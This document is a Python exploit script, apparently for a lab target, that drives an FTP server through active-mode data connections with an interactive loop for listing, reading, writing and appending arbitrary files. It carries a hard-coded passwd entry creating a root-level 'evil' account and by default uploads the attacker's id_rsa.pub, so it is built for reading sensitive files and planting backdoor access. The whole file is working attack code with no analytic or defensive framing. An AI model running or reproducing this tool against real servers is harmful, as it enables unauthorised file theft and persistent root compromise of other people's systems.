import socket
import time, sys

RHOST = '10.6.0.100'
LHOST = '10.6.0.10'
DEBUG = True
class tcp:
    class client:
        def __init__(self, ip, port, sock=None):
            if not sock:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((ip, port))
            self.sock, self.ip, self.port = sock, ip, port

        def read(self, decode=True, strip=True, timeout=10):
            self.sock.settimeout(timeout)
            res = self.sock.recv(1024).replace(b'\r', b'')
            if strip:
                res = res.strip()
            if decode:
                return res.decode('utf-8', errors='ignore')
            return res

        def read_forever(self, decode=True, strip=True):
            data = list()
            while True:
                res = self.read(decode=False, strip=False)
                if len(res) == 0:
                    break
                data.append(res)
            res = b''.join(data)
            if decode:
                res = res.decode('utf-8', errors='ignore')
            if strip:
                return res.strip()
            return res

        def write(self, data):
            if isinstance(data, str):
                data = data.encode()
            return self.sock.send(data)

        def close(self):
            return self.sock.close()

    class server(client):
        def __init__(self, port):
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.bind((LHOST, port))
            self.sock.listen(0)
            self.port = port

        def get_port(self):
            return self.sock.getsockname()[1]

        def accept(self):
            return tcp.client(None, None, sock=self.sock.accept()[0])


def PORT(sock, host, port):
    formatted_port = ','.join(host.split('.') + [str(port // 256), str(port % 256)])
    res = send_cmd(sock, ['PORT', formatted_port])
    return '200 PORT command successful' in res


def strip_slashes(data):
    while '//' in data:
        data = data.replace('//', '/')
    return data


def send_cmd(sock, cmd):
    if isinstance(cmd, str):
        cmd = [cmd]
    cmd = ' '.join(cmd)
    if DEBUG:
        print('---> ' + cmd)
    sock.write(cmd)
    time.sleep(0.5)
    try:
        res = sock.read()
        if DEBUG:
            for line in res.split('\n'):
                print('<--- ' + line)
    except socket.timeout:
        return ''
    return res.strip()


def setup_cmd_session(sock, cmd):
    server = tcp.server(0)  # let kernel pick a port
    port = server.get_port()
    print(f'TCP server on {LHOST}:{port}')
    PORT(sock, LHOST, port)
    res = send_cmd(sock, cmd)
    if not '150 Data connection opened; transfer starting' in res:
        print('The server did not send the response to the socket')
        return False
    client = server.accept()
    return server, client


def send_cmd_read_data(sock, cmd):
    output = setup_cmd_session(sock, cmd)
    if not output:
        return False
    server, client = output
    client.sock.settimeout(3)
    return client.read_forever()


def send_cmd_write_data(sock, cmd, data):
    print('CMD',cmd)
    print('DATA', data)
    output = setup_cmd_session(sock, cmd)
    if not output:
        return False
    server, client = output
    client.sock.settimeout(3)
    client.write(data)
    client.close()
    return True

def LIST(sock, path):
    files = send_cmd_read_data(sock, ['LIST', path])
    #files = list()
    # if not res or len(res.strip()) == 0:
    #     return files
    # for line in res.split('\n'):
    #     file_details = line.split(' ')
    #     files.append((file_details[-1], file_details[0]))  # (name, perms)
    return files
def RETR(sock, path):
    file_ = send_cmd_read_data(sock, ['RETR', path])
    return file_


def STOR(sock, path, data):
    return send_cmd_write_data(sock, ['STOR', path], data)

def APPE(sock, path, data):
    return send_cmd_write_data(sock, ['APPE', path], data)


line_pass = 'evil:$1$evil$nQuhWDmzDqj5JWJG19JQ0/:0:0:root:/root:/bin/bash'
if __name__ == '__main__':
    # make a nice pretty banner thing
    print("Start exploit...")
    sock = tcp.client(RHOST, 21)
    print(sock.read())
    while True:
        comm_line = input('Enter command:\r\n')
        cmd = comm_line.split(' ')[0]
        if cmd == 'exit':
            break
        elif cmd == 'list':
            path = comm_line.split(' ')[1]
            files = LIST(sock, path)
            print(files)
        elif cmd == 'stor':
            path = comm_line.split(' ')[1]
            if len(comm_line.split(' ')) > 2:
                DATA = comm_line.split(' ')[2]
            else:
                with open('id_rsa.pub', 'r') as f:
                    DATA = f.read()
            #print('!!!!!!!', f'PATH {path}', f'DATA {DATA}')
            if not STOR(sock, path, DATA):
                print(f'Failed to upload file to {path}')
            else:
                print(f'File uploaded to {path}')
        elif cmd == 'retr':
            path = comm_line.split(' ')[1]
            print(RETR(sock,path))
        elif cmd == 'appe':
            path = comm_line.split(' ')[1]
            DATA = comm_line.split(' ')[2]
            print('!!!!!!!', f'PATH {path}', f'DATA {DATA}')
            if not APPE(sock, path, DATA):
                print(f'Failed to upload file to {path}')
            else:
                print(f'File uploaded to {path}')
